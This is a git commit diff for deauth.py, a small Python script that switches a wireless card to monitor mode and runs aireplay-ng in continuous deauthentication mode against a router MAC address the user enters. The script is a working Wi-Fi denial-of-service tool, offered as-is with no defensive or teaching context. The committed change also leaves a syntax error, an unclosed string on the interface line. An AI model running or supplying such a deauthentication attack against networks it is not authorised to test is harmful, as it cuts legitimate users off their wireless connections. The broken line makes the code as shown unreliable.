2bb7275e294d5609c01c559a7f7d34b4a9292707
sudoaptinstalllevi <fcloudservice@gmail.com>
2025-06-24 23:38:02 +1000

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -1,13 +1,12 @@
 import os 
 
 os.system("sudo airmon-ng start wlan0")
-interface = input("enter your interface: ")
+interface = "wlan0
 ent_ch = input("enter your network channel: ")
 os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
-  os.system("cls")
   enter_mac_address = input("enter the ap of the router: ")
   os.system(f"sudo aireplay-ng -0 0 -a {enter_mac_address} wlan0")
 except KeyboardInterrupt:
- os.system("cls")
+  print("exited")
 
